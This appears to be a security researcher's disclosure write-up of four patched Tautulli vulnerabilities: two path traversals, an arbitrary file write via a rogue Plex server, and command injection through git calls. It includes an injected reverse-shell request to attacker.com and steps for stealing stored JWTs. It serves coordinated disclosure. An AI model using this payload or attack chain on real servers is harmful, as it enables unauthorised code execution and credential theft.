@@ -1,0 +1,160 @@
+<!doctype html> <html lang=en > <meta charset=UTF-8 > <meta name=viewport  content="width=device-width, initial-scale=1"> <link rel=stylesheet  href="/wednesday/libs/highlight/styles/base16/chalk.min.css" /> <link rel=stylesheet  href="/wednesday/css/franklin.css" /> <link rel=stylesheet  href="/wednesday/css/tufte.css" /> <link rel=stylesheet  href="/wednesday/css/latex.css" /> <link rel=stylesheet  href="/wednesday/css/adjust.css" /> <link rel=icon  href="/wednesday/assets/favicon.png" /> <title>CVE-2025-5876&#123;0-3&#125;</title> <div id=layout > <div id=menu > <ul> <li><a href="/wednesday/">home</a> <li><a href="/wednesday/about/">about</a> <li><a href="/wednesday/ctf/">ctf</a> <li><a href="/wednesday/research/">research</a> </ul> </div> <div id=main ></div> </div> <div class=franklin-content ><h1 id=cve-2025-58760-3 ><a href="#cve-2025-58760-3" class=header-anchor >CVE-2025-5876&#123;0-3&#125;</a></h1> <p><a href="https://github.com/Tautulli/Tautulli">Tautulli</a> is a Python-based web application for managing monitoring, analytics and notifications for <a href="https:plex.tv/">Plex Media Server</a>. The project is open-sourced under the GPL-3.0 license and currently has over 6.1k stars on GitHub.</p> <p>Four vulnerabilities affecting versions 2.15.3 &#40;published August 3rd, 2025&#41; and prior were identified during a review of Tautulli&#39;s codebase. With certain preconditions, these vulnerabilities can be chained to achieve unauthenticated remote code execution on the application server.</p> <p>All issues below were disclosed to the project maintainers, and have been patched in version 2.16.0 &#40;released September 11th, 2025&#41;.</p> <h4 id=path_traversal_in_image_endpoint_cve-2025-58760 ><a href="#path_traversal_in_image_endpoint_cve-2025-58760" class=header-anchor >Path Traversal in <code>/image</code> endpoint &#40;CVE-2025-58760&#41;</a></h4> <p>Tautulli is built upon the <a href="https://docs.cherrypy.dev/en/latest/">CherryPy</a> minimalist web framework. Within CherryPy, routes are defined similarly to Flask, using decorators to expose endpoints and attach request-handling logic. For example, in the following function:</p> <pre><code class="python hljs"><span class=hljs-meta >@cherrypy.expose</span>
+<span class=hljs-meta >@cherrypy.tools.json_out()</span>
+<span class=hljs-meta >@requireAuth(<span class=hljs-params >member_of(<span class=hljs-params ><span class=hljs-string >&quot;admin&quot;</span></span>)</span>)</span>
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">save_pms_token</span>(<span class=hljs-params >self, token=<span class=hljs-literal >None</span>, client_id=<span class=hljs-literal >None</span>, **kwargs</span>):
+    <span class=hljs-keyword >if</span> token <span class=hljs-keyword >is</span> <span class=hljs-keyword >not</span> <span class=hljs-literal >None</span>:
+        plexpy.CONFIG.PMS_TOKEN = token
+    <span class=hljs-keyword >if</span> client_id <span class=hljs-keyword >is</span> <span class=hljs-keyword >not</span> <span class=hljs-literal >None</span>:
+        plexpy.CONFIG.PMS_CLIENT_ID = client_id
+    plexpy.CONFIG.write()</code></pre> <ul> <li><p><code>@cherrypy.expose</code> marks the function as an HTTP-accessible endpoint. Without this, CherryPy ignores the function for routing purposes.</p> <li><p><code>@cherrypy.tools.json_out&#40;&#41;</code> automatically serialises the return value of the function to JSON.</p> <li><p><code>@requireAuth&#40;member_of&#40;&quot;admin&quot;&#41;&#41;</code> is a custom decorator which modifies the function&#39;s &#96;auth.require&#96; attribute to include authentication conditions.</p> </ul> <p>To enumerate the pre-authentication attack surface, we focused on routes exposed via <code>@cherrypy.expose</code> that did not enforce authentication with <code>@requireAuth</code>. Immediately, the following function seemed interesting:</p> <pre><code class="python hljs"><span class=hljs-meta >@cherrypy.expose</span>
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">image</span>(<span class=hljs-params >self, *args, **kwargs</span>):
+    <span class=hljs-keyword >if</span> args:
+        cherrypy.response.headers[<span class=hljs-string >&#x27;Cache-Control&#x27;</span>] = <span class=hljs-string >&#x27;max-age=3600&#x27;</span>  <span class=hljs-comment ># 1 hour</span>
+
+        <span class=hljs-keyword >if</span> <span class=hljs-built_in >len</span>(args) &gt;= <span class=hljs-number >2</span> <span class=hljs-keyword >and</span> args[<span class=hljs-number >0</span>] == <span class=hljs-string >&#x27;images&#x27;</span>:
+            resource_dir = os.path.join(<span class=hljs-built_in >str</span>(plexpy.PROG_DIR), <span class=hljs-string >&#x27;data/interfaces/default/&#x27;</span>)
+            <span class=hljs-keyword >try</span>:
+                <span class=hljs-keyword >return</span> serve_file(path=os.path.join(resource_dir, *args), content_type=<span class=hljs-string >&#x27;image/png&#x27;</span>)
+            <span class=hljs-keyword >except</span> NotFound:
+                <span class=hljs-keyword >return</span>
+    ⋮
+    <span class=hljs-keyword >return</span></code></pre> <p>Looking through the documentation for how CherryPy handles <a href="https://docs.cherrypy.dev/en/stable/pkg/cherrypy._cpdispatch.html#cherrypy._cpdispatch.Dispatcher.find_handler">route dispatch</a>, we see that any path segments which aren&#39;t used in resolving the route are automatically passed as positional arguments to the route handler. Hence in the above function, we have complete control over the value of <code>*args</code>. These arguments are then joined to <code>data/interfaces/default/</code> and passed to <code>serve_file</code> without sanitisation, enabling path traversal. Since the file contents are returned to the user directly, this gives us an arbitrary file read on the application server.</p> <h4 id=path_traversal_in_pms_image_proxy_cve-2025-58761 ><a href="#path_traversal_in_pms_image_proxy_cve-2025-58761" class=header-anchor >Path Traversal in <code>/pms_image_proxy</code> &#40;CVE-2025-58761&#41;</a></h4> <p>Another candidate for path traversal was the <code>/pms_image_proxy</code> endpoint. This endpoint is used to fetch an image directly from the backing Plex Media Server, typically for movie thumbnails or background images. The image to be fetched is specified through an <code>img</code> URL parameter, which can either be a URL or a file path.</p> <pre><code class="python hljs"><span class=hljs-meta >@addtoapi(<span class=hljs-params ><span class=hljs-string >&#x27;pms_image_proxy&#x27;</span></span>)</span>
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">real_pms_image_proxy</span>(<span class=hljs-params >self, img=<span class=hljs-literal >None</span>, rating_key=<span class=hljs-literal >None</span>, width=<span class=hljs-number >750</span>, height=<span class=hljs-number >1000</span>,
+                         opacity=<span class=hljs-number >100</span>, background=<span class=hljs-string >&#x27;000000&#x27;</span>, blur=<span class=hljs-number >0</span>, img_format=<span class=hljs-string >&#x27;png&#x27;</span>,
+                         fallback=<span class=hljs-literal >None</span>, refresh=<span class=hljs-literal >False</span>, clip=<span class=hljs-literal >False</span>, **kwargs</span>):
+
+    cherrypy.response.headers[<span class=hljs-string >&#x27;Cache-Control&#x27;</span>] = <span class=hljs-string >&#x27;max-age=2592000&#x27;</span>  <span class=hljs-comment ># 30 days</span>
+
+    <span class=hljs-keyword >if</span> <span class=hljs-built_in >isinstance</span>(img, <span class=hljs-built_in >str</span>) <span class=hljs-keyword >and</span> img.startswith(<span class=hljs-string >&#x27;interfaces/default/images&#x27;</span>):
+        fp = os.path.join(plexpy.PROG_DIR, <span class=hljs-string >&#x27;data&#x27;</span>, img)
+        ext = img.rsplit(<span class=hljs-string >&quot;.&quot;</span>, <span class=hljs-number >1</span>)[-<span class=hljs-number >1</span>]
+        <span class=hljs-keyword >if</span> ext == <span class=hljs-string >&#x27;svg&#x27;</span>:
+            content_type = <span class=hljs-string >&#x27;image/svg+xml&#x27;</span>
+        <span class=hljs-keyword >else</span>:
+            content_type = <span class=hljs-string >&#x27;image/{}&#x27;</span>.<span class=hljs-built_in >format</span>(ext)
+        <span class=hljs-keyword >return</span> serve_file(path=fp, content_type=content_type)</code></pre> <p>Although there is some validation to ensure that <code>img</code> begins with the prefix <code>interfaces/default/images</code>, this can be bypassed by passing an <code>img</code> parameter which begins with a valid prefix, and then adjoining path traversal characters in order to reach files outside of intended directories. This gives us a second method of reading arbitrary files from the application server.</p> <h4 id=impacts ><a href="#impacts" class=header-anchor >Impacts</a></h4> <p>In addition to the usual LFI targets, there are two files of particular importance within Tautulli, as they contain application specific secrets which may enable privilege escalation.</p> <p>The first is the application&#39;s configuration file, located at <code>/config/config.ini</code> within the published Docker image. This file contains:</p> <ul> <li><p>The administrator&#39;s hashed password,</p> <li><p>An API key intended for programmatic access to a restricted subset of features,</p> <li><p>The symmetric secret used to sign JWTs</p> </ul> <p>Originally, we thought that having access to the JWT secret meant we would be able to issue JWTs to ourselves to escalate privileges. Unfortunately, the application stores all JWTs it issues inside the database, and during the authentication flow, it performs one final check to see if the client&#39;s JWT is present within the DB:</p> <pre><code class="python hljs"><span class=hljs-keyword >def</span> <span class="hljs-title function_">check_jwt_token</span>():
+    jwt_token = get_jwt_token()
+
+    <span class=hljs-keyword >if</span> jwt_token:
+        <span class=hljs-keyword >try</span>:
+            payload = jwt.decode(
+                jwt_token, plexpy.CONFIG.JWT_SECRET, leeway=timedelta(seconds=<span class=hljs-number >10</span>), algorithms=[JWT_ALGORITHM]
+            )
+        <span class=hljs-keyword >except</span> (jwt.DecodeError, jwt.ExpiredSignatureError):
+            <span class=hljs-keyword >return</span> <span class=hljs-literal >None</span>
+
+        <span class=hljs-keyword >if</span> <span class=hljs-keyword >not</span> Users().get_user_login(jwt_token=jwt_token): <span class=hljs-comment ># &lt;--- JWT in database check</span>
+            <span class=hljs-keyword >return</span> <span class=hljs-literal >None</span>
+
+        <span class=hljs-keyword >return</span> payload</code></pre> <p>Because of this, we can&#39;t forge JWTs for ourselves. However, we can use our arbitrary read to exfiltrate the application database, located at <code>/config/tautulli.db</code> within the Docker image. The JWTs issued by Tautulli expire after 30 days when &#39;remember me&#39; is checked on sign-in, and issued tokens are only purged from the database when the user manually logs out or when the user attempts to access an authenticated route with an expired token. Hence with some luck, there may still be tokens cached within the database which can be exfiltrated and reused.</p> <pre><code class="sh hljs">❯ sqlite3 tautulli.db
+SQLite version 3.50.4 2025-07-30 19:33:53
+Enter <span class=hljs-string >&quot;.help&quot;</span> <span class=hljs-keyword >for</span> usage hints.
+sqlite&gt; <span class=hljs-keyword >select</span> jwt_token from user_login;
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjpudWxsLCJ1c2VyIjoiYWRtaW4iLCJ1c2VyX2dyb3VwIjoiYWRtaW4iLCJleHAiOjE3NTc0OTM1MjB9.VWP6TVbuLRM_2xILP7cBJmW3IXpXTTYLEFd4li_gaeU</code></pre> <p>An alternative, of course is to crack the hashed password we obtained from <code>/config/config.ini</code>. Assuming all goes well, we can elevate our privileges from an unauthenticated attacker to an administrator, allowing us to access the authenticated attack surface.</p> <p>Frustratingly, this database check is the only barrier stopping us from escalating privileges unconditionally. Although a 30 day expiry window still gives an attacker good chances of success, it nonetheless requires a bit of luck to pull off, hence why we can only say &#39;unauthenticated&#40;*&#41; RCE&#39;; with an asterisk.</p> <h4 id=authenticated_rce_two_methods ><a href="#authenticated_rce_two_methods" class=header-anchor >Authenticated RCE &#40;Two Methods&#41;</a></h4> <p>Upon finding the privilege escalation attack path, we turned our eye to any authenticated methods of achieving RCE, which we could chain with the earlier vulnerabilities.</p> <p>One feature available to administrative users in Tautulli is the script notification agent. The intended purpose of this agent is to send notifications to registered users, and it can be configured to run a Python script &#40;file ending in <code>.py</code>&#41; directly from the local filesystem. Hence if we can get a file write where we control the extension, we can automatically escalate to RCE.</p> <p>Unfortunately, there seems to be a dearth of good write primitives available to us, even with administrative privileges. This leads to the following rather inelegant method:</p> <h4 id=rce_via_file_write_primitive_and_script_agent_cve-2025-58762 ><a href="#rce_via_file_write_primitive_and_script_agent_cve-2025-58762" class=header-anchor >RCE via file write primitive and script agent &#40;CVE-2025-58762&#41;</a></h4> <p>Administrators within Tautulli can change the URL of the Plex Media Server &#40;PMS&#41; within the application&#39;s settings. By pointing this to an attacker-controlled server, they can trick the <code>pms_image_proxy</code> endpoint into writing a file for them.</p> <p>The attack proceeds as follows:</p> <ol> <li><p>The attacker calls <code>/pms_image_proxy</code> with the <code>img</code> parameter set to a URL beginning with <code>http</code>,</p> <li><p>Within this call, they set the <code>img_format</code> parameter to <code>py</code>.</p> </ol> <p>Tautulli constructs the destination file path by combining a hash with the user-controlled <code>img_format</code> parameter. Since <code>img_format</code> isn&#39;t sanitised, this allows the attacker to control the final file extension.</p> <pre><code class="python hljs"><span class=hljs-meta >@addtoapi(<span class=hljs-params ><span class=hljs-string >&#x27;pms_image_proxy&#x27;</span></span>)</span>
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">real_pms_image_proxy</span>(<span class=hljs-params >self, img=<span class=hljs-literal >None</span>, rating_key=<span class=hljs-literal >None</span>, width=<span class=hljs-number >750</span>, height=<span class=hljs-number >1000</span>,
+                         opacity=<span class=hljs-number >100</span>, background=<span class=hljs-string >&#x27;000000&#x27;</span>, blur=<span class=hljs-number >0</span>, img_format=<span class=hljs-string >&#x27;png&#x27;</span>,
+                         fallback=<span class=hljs-literal >None</span>, refresh=<span class=hljs-literal >False</span>, clip=<span class=hljs-literal >False</span>, **kwargs</span>):
+
+    ⋮
+    img_hash = notification_handler.set_hash_image_info(
+        img=img, rating_key=rating_key, width=width, height=height,
+        opacity=opacity, background=background, blur=blur, fallback=fallback,
+        add_to_db=return_hash)
+
+    <span class=hljs-keyword >if</span> return_hash:
+        <span class=hljs-keyword >return</span> {<span class=hljs-string >&#x27;img_hash&#x27;</span>: img_hash}
+
+    fp = <span class=hljs-string >&#x27;{}.{}&#x27;</span>.<span class=hljs-built_in >format</span>(img_hash, img_format)  <span class=hljs-comment ># we want to be able to preview the thumbs</span>
+    c_dir = os.path.join(plexpy.CONFIG.CACHE_DIR, <span class=hljs-string >&#x27;images&#x27;</span>)
+    ffp = os.path.join(c_dir, fp)</code></pre> <p>If the destination file doesn&#39;t exist locally, Tautulli will fetch it from the configured PMS &#40;the attacker&#39;s server&#41; and write the response content to the path specified by the attacker.</p> <pre><code class="python hljs">⋮
+    <span class=hljs-keyword >try</span>:
+    ⋮
+    <span class=hljs-keyword >except</span> NotFound:
+        <span class=hljs-comment ># the image does not exist, download it from pms</span>
+        <span class=hljs-keyword >try</span>:
+            pms_connect = pmsconnect.PmsConnect()
+            pms_connect.request_handler._silent = <span class=hljs-literal >True</span>
+            result = pms_connect.get_image(img=img,
+                                           width=width,
+                                           height=height,
+                                           opacity=opacity,
+                                           background=background,
+                                           blur=blur,
+                                           img_format=img_format,
+                                           clip=clip,
+                                           refresh=refresh)
+
+            <span class=hljs-keyword >if</span> result <span class=hljs-keyword >and</span> result[<span class=hljs-number >0</span>]:
+                cherrypy.response.headers[<span class=hljs-string >&#x27;Content-type&#x27;</span>] = result[<span class=hljs-number >1</span>]
+                <span class=hljs-keyword >if</span> plexpy.CONFIG.CACHE_IMAGES <span class=hljs-keyword >and</span> <span class=hljs-string >&#x27;indexes&#x27;</span> <span class=hljs-keyword >not</span> <span class=hljs-keyword >in</span> img:
+                    <span class=hljs-keyword >with</span> <span class=hljs-built_in >open</span>(ffp, <span class=hljs-string >&#x27;wb&#x27;</span>) <span class=hljs-keyword >as</span> f:
+                        f.write(result[<span class=hljs-number >0</span>])</code></pre> <p>Assuming the PMS server is configured to be <code>https://attacker.com/</code>, the <code>pms_connect.get_image</code> function will make a HTTP request to the URL</p> <pre><code class="julia hljs">https://attacker.com/photo/:/transcoe?url=http://example.com/image?width=<span class=hljs-number >1000</span>&amp;height=<span class=hljs-number >1500</span>&amp;format=py</code></pre>
+<p>The attacker can then reply to this request with whatever response they like, the contents of which will be written to the destination file. With an arbitrary Python script now written to the filesystem, the attacker can use the script notification agent to execute the script, achieving RCE.</p>
+<h4 id=rce_via_command_injection_cve-2025-58763 ><a href="#rce_via_command_injection_cve-2025-58763" class=header-anchor >RCE via command injection &#40;CVE-2025-58763&#41;</a></h4>
+<p>Alternatively, if we want to avoid the convoluted method above, and the Tautulli instance we&#39;re targeting is installed manually, then there is a simpler method of achieving RCE.</p>
+<p>When Tautulli is cloned directly from GitHub and installed manually, the application manages updates and versioning through calls to the <code>git</code> command. In the code, this is performed through the <code>runGit</code> function in <code>versioncheck.py</code>.</p>
+<pre><code class="python hljs"><span class=hljs-keyword >def</span> <span class="hljs-title function_">runGit</span>(<span class=hljs-params >args</span>):
+    <span class=hljs-keyword >if</span> plexpy.CONFIG.GIT_PATH:
+        git_locations = [<span class=hljs-string >&#x27;&quot;&#x27;</span> + plexpy.CONFIG.GIT_PATH + <span class=hljs-string >&#x27;&quot;&#x27;</span>]
+    <span class=hljs-keyword >else</span>:
+        git_locations = [<span class=hljs-string >&#x27;git&#x27;</span>]
+    <span class=hljs-keyword >if</span> platform.system().lower() == <span class=hljs-string >&#x27;darwin&#x27;</span>:
+        git_locations.append(<span class=hljs-string >&#x27;/usr/local/git/bin/git&#x27;</span>)
+    output = err = <span class=hljs-literal >None</span>
+    <span class=hljs-keyword >for</span> cur_git <span class=hljs-keyword >in</span> git_locations:
+        cmd = cur_git + <span class=hljs-string >&#x27; &#x27;</span> + args
+        <span class=hljs-keyword >try</span>:
+            logger.debug(<span class=hljs-string >&#x27;Trying to execute: &quot;&#x27;</span> + cmd + <span class=hljs-string >&#x27;&quot; with shell in &#x27;</span> + plexpy.PROG_DIR)
+            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=<span class=hljs-literal >True</span>, cwd=plexpy.PROG_DIR)
+            output, err = p.communicate()
+            output = output.strip().decode()
+            logger.debug(<span class=hljs-string >&#x27;Git output: &#x27;</span> + output)</code></pre>
+<p>Since <code>shell&#61;True</code> is passed to <code>subproces.Popen</code>, this call is vulnerable to to command injection, as shell characters within arguments will be passed to the underlying shell.</p>
+<p>A concrete location where this can be triggered is in the <code>checkout_git_branch</code> endpoint. This endpoint stores a user-supplied remote and branch name into the <code>GIT_REMOTE</code> and <code>GIT_BRANCH</code> configuration keys without sanitisation.</p>
+<pre><code class="python hljs"><span class=hljs-meta >@cherrypy.expose</span>
+<span class=hljs-meta >@requireAuth(<span class=hljs-params >member_of(<span class=hljs-params ><span class=hljs-string >&quot;admin&quot;</span></span>)</span>)</span>
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">checkout_git_branch</span>(<span class=hljs-params >self, git_remote=<span class=hljs-literal >None</span>, git_branch=<span class=hljs-literal >None</span>, **kwargs</span>):
+    <span class=hljs-keyword >if</span> git_branch == plexpy.CONFIG.GIT_BRANCH:
+        logger.error(<span class=hljs-string >&quot;Already on the %s branch&quot;</span> % git_branch)
+        <span class=hljs-keyword >raise</span> cherrypy.HTTPRedirect(plexpy.HTTP_ROOT + <span class=hljs-string >&quot;home&quot;</span>)
+
+    <span class=hljs-comment ># Set the new git remote and branch</span>
+    plexpy.CONFIG.GIT_REMOTE = git_remote
+    plexpy.CONFIG.GIT_BRANCH = git_branch
+    plexpy.CONFIG.write()
+    <span class=hljs-keyword >return</span> <span class="hljs-variable language_">self</span>.do_state_change(<span class=hljs-string >&#x27;checkout&#x27;</span>, <span class=hljs-string >&#x27;Switching Git Branches&#x27;</span>, <span class=hljs-number >120</span>)</code></pre>
+<p>Downstream, these keys are then fetched and passed directly into <code>runGit</code> using a format string.</p>
+<pre><code class="python hljs"><span class=hljs-meta >@cherrypy.expose</span>
+<span class=hljs-meta >@requireAuth(<span class=hljs-params >member_of(<span class=hljs-params ><span class=hljs-string >&quot;admin&quot;</span></span>)</span>)</span>
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">checkout_git_branch</span>():
+    <span class=hljs-keyword >if</span> plexpy.INSTALL_TYPE == <span class=hljs-string >&#x27;git&#x27;</span>:
+        logger.info(<span class=hljs-string >&#x27;Attempting to checkout git branch &quot;{}/{}&quot;&#x27;</span>.<span class=hljs-built_in >format</span>(plexpy.CONFIG.GIT_REMOTE,
+                                                                       plexpy.CONFIG.GIT_BRANCH))
+
+        output, err = runGit(<span class=hljs-string >&#x27;fetch {}&#x27;</span>.<span class=hljs-built_in >format</span>(plexpy.CONFIG.GIT_REMOTE))
+        output, err = runGit(<span class=hljs-string >&#x27;checkout {}&#x27;</span>.<span class=hljs-built_in >format</span>(plexpy.CONFIG.GIT_BRANCH))</code></pre>
+<p>Hence, code execution can be obtained by using <code>&#36;&#40;&#41;</code> interpolation in a command like this:</p>
+<pre><code class="julia hljs">GET /checkout_git_branch?git_remote=$(sh+-c+&#x27;bash+-i+&gt;%<span class=hljs-number >26</span>+/dev/tcp/attacker.com/<span class=hljs-number >443</span>+<span class=hljs-number >0</span>&gt;%<span class=hljs-number >261</span>&#x27;)</code></pre>
+<h4 id=timeline ><a href="#timeline" class=header-anchor >Timeline</a></h4>
+<ul>
+<li><p>August 13 2025: Initial disclosure to Tautulli via GitHub Security Advisories</p>
+
+<li><p>September 2 2025: Patches implemented and retested.</p>
+
+<li><p>September 9 2025: Coordinated disclosure: Tautulli v2.16.0 and GitHub Security Advisories published.</p>
+
+</ul>
+</div>
+        </div> 
+    </div> 
+    
+    
+        <script src="/wednesday/libs/highlight/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script>
+<script src="/wednesday/libs/highlight/rust.min.js"></script>
+<script src="/wednesday/libs/highlight/csharp.min.js"></script>
+<script>
+  hljs.highlightAll();
+  hljs.configure({ tabReplace: "    " });
+</script>
